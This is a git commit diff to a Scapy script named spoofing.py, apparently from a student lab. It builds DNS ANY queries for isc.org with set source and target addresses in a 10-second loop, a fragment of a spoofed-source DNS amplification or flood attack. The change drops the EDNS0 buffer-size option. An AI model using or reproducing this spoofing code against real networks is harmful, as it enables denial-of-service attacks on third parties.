523b2bdffb4c9e1c6ec332bdbe2c879c4711f39f
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-10 01:28:58 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -5,7 +5,7 @@ A= "192.168.30.1"
 B= "192.168.20.1"
 C= RandShort()
 D= 53
-E= DNS(rd=1L, qd=DNSQR(qname="isc.org.", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
+E= DNS(rd=1L, qd=DNSQR(qname="isc.org.", qtype="ALL", qclass="IN"))
 
 start = time.time()
 while (time.time() - start < 10):
